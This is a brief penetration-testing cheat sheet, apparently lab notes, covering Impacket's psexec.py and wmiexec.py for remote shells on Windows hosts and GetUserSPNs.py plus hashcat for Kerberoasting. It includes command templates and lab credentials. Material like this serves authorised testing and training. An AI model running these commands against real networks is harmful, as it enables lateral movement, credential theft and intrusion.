### PSexec.py
The tool creates a remote service by uploading a randomly-named executable to the ADMIN$ share on the target host. It then registers the service via RPC and the Windows Service Control Manager. Will be dropped in the SYSTEM context
```
psexec.py domain.local/username:'password'@host.ip
psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125
```

### WMIexec.py
Stealthier approach than PSexec. Wmiexec.py utilizes a semi-interactive shell where commands are executed through Windows Management Instrumentation.
```
wmiexec.py domain.local/username:'password'@host.ip
wmixec.py inlanefreight.local/wley:'transporter@4'@172.16.5.125
```

### GetUserSPNs.py
Kerberoasting with Linux
```
GetUserSPNs.py -dc-ip <172.16.5.5> <domain.LOCAL>/<user> -request
GetUserSPNs.py -dc-ip <172.16.5.5> <domain.LOCAL>/<user> -request-user <any-user> -outputfile <text-file-name>
hashcat -m 13100 <text-file-name> /usr/share/wordlists/rockyou.txt 
```
